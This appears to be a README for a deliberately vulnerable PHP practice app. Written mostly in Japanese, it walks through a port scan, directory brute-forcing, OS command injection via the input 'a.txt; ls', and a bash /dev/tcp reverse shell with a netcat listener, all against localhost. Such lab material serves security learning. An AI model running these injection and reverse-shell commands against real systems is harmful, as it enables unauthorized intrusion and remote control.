# vulnable_sample
## use
### easy use way
```php -S localhost:8080```
### exploit
ポートスキャン  
```
nmap -p- localhost
> 8080/tcp closed http-proxy
```
ディレクトリブルートフォース　　
```
dirb http://localhost
> + http://localhost:8080/command (CODE:200|SIZE:434)                       
> + http://localhost:8080/robots.txt (CODE:200|SIZE:32)
```
web調査
```
ブラウザでhttp://localhost:8080を開くと空ページ  
robots.txtを確認するとcommandというページがある事がわかる  
/commandにアクセスするとOpen Fileというページ  
ソースコードを見るとサイトの使い方が書いている  
```
エクスプロイト
```
OSコマンドインジェクションを行える
a.txt; ls
でlsコマンドが実行できる
```
リバースシェル
```
# 手元のPCで実行
nc -nvlp 1234
```
```
# 対象のPCに対して
bash -i >& /dev/tcp/127.0.0.1/1234 0>&1
```
---
以上の流れでサーバのIPアドレスだけからWebページが空いている事を見つけて，よくあるrobots.txtからのディレクトリの発見や，表からは見えないディレクトリの発見を行う．そこから，ソースコードの情報を元に攻撃方法を推測しコマンド実行を行う(ファイルを読み込んでるのか他の方法OSコマンドからファイルを出力してるのか...).攻撃をより行いやすいようにリバースシェルの接続を行う．

